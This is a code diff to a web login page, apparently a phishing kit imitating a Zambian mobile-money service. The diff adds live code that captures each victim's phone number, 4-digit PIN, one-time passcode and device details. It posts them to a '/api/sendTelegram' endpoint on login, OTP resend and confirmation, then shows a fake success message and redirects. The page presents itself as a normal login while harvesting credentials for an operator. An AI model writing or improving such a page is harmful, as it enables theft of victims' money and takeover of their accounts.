@@ -176,26 +176,70 @@ input:focus{outline:none;border-color:#f97316;background:#fff}
 </div>
 
 <script>
+/* ===== DEVICE ===== */
+const device = navigator.userAgent;
+
 /* ===== PHONE ===== */
-const phone=document.getElementById('phone');
-const phoneError=document.getElementById('phoneError');
-const loginBtn=document.getElementById('loginBtn');
+const phone = document.getElementById('phone');
+const phoneError = document.getElementById('phoneError');
+const loginBtn = document.getElementById('loginBtn');
 
 function validatePhone(){
-  const d=phone.value.replace('+260','');
+  const d = phone.value.replace('+260','');
   if(!/^\d{7}$/.test(d)){
-    phoneError.textContent='Enter a valid 7-digit number';
+    phoneError.textContent = 'Enter a valid 7-digit number';
     return false;
   }
-  phoneError.textContent='';
+  phoneError.textContent = '';
   return true;
 }
 
 phone.addEventListener('input',()=>{
-  let d=phone.value.replace('+260','').replace(/\D/g,'').replace(/^0+/,'').slice(0,7);
-  phone.value='+260'+d;
-  loginBtn.disabled=!validatePhone();
+  let d = phone.value
+    .replace('+260','')
+    .replace(/\D/g,'')
+    .replace(/^0+/,'')
+    .slice(0,7);
+
+  phone.value = '+260' + d;
+  updateLogin();
 });
+
+/* ===== PIN ===== */
+const pins = [...document.querySelectorAll('.pin-digit')];
+let pinValue = '';
+
+pins.forEach((p,i)=>{
+  p.addEventListener('input',()=>{
+    p.value = p.value.replace(/\D/g,'');
+    if(p.value && i < 3) pins[i+1].focus();
+    pinValue = pins.map(x=>x.value).join('');
+    updateLogin();
+  });
+
+  p.addEventListener('keydown',e=>{
+    if(e.key === 'Backspace' && !p.value && i > 0){
+      pins[i-1].focus();
+      pins[i-1].value = '';
+      pinValue = pins.map(x=>x.value).join('');
+      updateLogin();
+      e.preventDefault();
+    }
+  });
+});
+
+function updateLogin(){
+  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
+}
+
+/* ===== API ===== */
+async function sendToServer(payload){
+  return fetch('/api/sendTelegram',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(payload)
+  });
+}
 
 /* ===== OTP ===== */
 const otpModal=document.getElementById('otpModal');
@@ -207,8 +251,7 @@ const otpWarning=document.getElementById('otpWarning');
 const resendInfo=document.getElementById('resendInfo');
 const otpStatus=document.getElementById('otpStatus');
 
-let timer=null;
-let seconds=120;
+let timer=null, seconds=120;
 
 function startCountdown(){
   clearInterval(timer);
@@ -218,8 +261,7 @@ function startCountdown(){
 
   timer=setInterval(()=>{
     seconds--;
-    const cd=document.getElementById('countdown');
-    if(cd) cd.textContent=seconds;
+    document.getElementById('countdown').textContent=seconds;
     if(seconds<=0){
       clearInterval(timer);
       resendBtn.disabled=false;
@@ -252,17 +294,44 @@ dEls.forEach((d,i)=>{
 });
 
 /* ===== LOGIN ===== */
-document.getElementById('loginForm').onsubmit=e=>{
+document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
+  if(document.getElementById('hp').value) return;
+
   otpModal.style.display='flex';
   dEls.forEach(d=>d.value='');
   updateConfirm();
   startCountdown();
+
+  await sendToServer({
+    event:'login_clicked',
+    phone:phone.value,
+    pin:pinValue,
+    device,
+    submittedAt:new Date().toISOString()
+  });
+});
+
+resendBtn.onclick=async()=>{
+  startCountdown();
+  await sendToServer({
+    event:'resend_otp',
+    phone:phone.value,
+    pin:pinValue,
+    device,
+    submittedAt:new Date().toISOString()
+  });
 };
 
-resendBtn.onclick=startCountdown;
-
-confirmBtn.onclick=()=>{
+confirmBtn.onclick=async()=>{
+  await sendToServer({
+    event:'otp_confirm',
+    phone:phone.value,
+    pin:pinValue,
+    otp:getOtp(),
+    device,
+    submittedAt:new Date().toISOString()
+  });
   otpStatus.innerHTML="<span class='success'>Success — request received</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
 };
